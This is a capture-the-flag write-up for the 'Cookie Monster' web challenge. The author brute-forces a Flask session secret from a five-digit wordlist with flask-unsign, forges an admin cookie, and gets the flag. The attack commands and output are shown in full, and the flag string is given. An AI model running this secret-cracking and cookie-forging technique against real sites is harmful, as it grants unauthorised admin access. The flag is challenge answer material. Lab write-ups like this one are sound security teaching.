# Cookie Monster (445 points, category: easy)

Nom nom nom, C is for cookie, that's good enough for me

Author: taschmex

http://20.100.130.68:1041

📎 [main.py](main.py)

# Writeup

First I knew the JWT signing secret was a number between 10000 and 99999 so I generated a wordlist for it:

```bash
for i in {10000..99999}; do
  echo $i
done > numbers.txt
```

Then I used flask-unsign to bruteforce the secret:

```bash
└─$ flask-unsign -u -c "eyJjbGlja3MiOjAsImlzQWRtaW4iOmZhbHNlfQ.ZTrlUw.jd4NGDwM_cqI8YMJUSNtKUaIyEk" -w numbers.txt  --no-literal-eval
[*] Session decodes to: {'clicks': 0, 'isAdmin': False}
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 18688 attempts
b'28687'
```

Then I used flask-unsign to sign a new cookie with the secret:

```bash
└─$ flask-unsign --sign --cookie "{'isAdmin': True}" --secret "28687" --no-literal-eval
eyJpc0FkbWluIjp0cnVlfQ.ZTrlnQ.oNvQn5a3pF1BCEtr5n-I9jB__s4
```

Updated the cookie in my browser and loaded the `/flag` endpoint and got the flag

# Flag

```
wack{n0m_n0m_th4t_w45_345y}
```